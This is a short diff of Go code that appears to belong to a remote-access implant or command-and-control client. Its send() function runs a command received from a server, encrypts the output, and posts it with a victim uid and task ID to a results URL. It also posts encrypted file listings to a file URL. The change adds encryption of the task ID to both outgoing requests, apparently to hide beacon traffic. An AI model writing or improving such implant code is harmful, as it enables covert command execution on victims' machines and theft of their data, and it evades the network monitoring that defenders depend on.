@@ -731,13 +731,14 @@ func send() { //发送头部信息
         result := Command(cmd)
         if result != "" {
             encry_result := get_encry_s(&result)
+			encry_task := get_encry_s(&taskid)
             if encry_result == "" {
                 return
             }
             data:= map[string]string{
                 "/*uid*/": uid,
                 "/*result*/": encry_result,
-                "/*info*/": taskid,
+                "/*info*/": encry_task,
             }
             post(data, re_url)
         }
@@ -798,10 +799,11 @@ func send() { //发送头部信息
         }
         fileData := cmd + "*//*" + fileNames
         encryptedStr := get_encry_s(&fileData)
+		encryptedTask := get_encry_s(&taskid)
         data := map[string]string{
             "/*uid*/":  uid,
             "/*result*/": encryptedStr,
-            "/*info*/": taskid,
+            "/*info*/": encryptedTask,
         }
         post(data, file_url)
     }
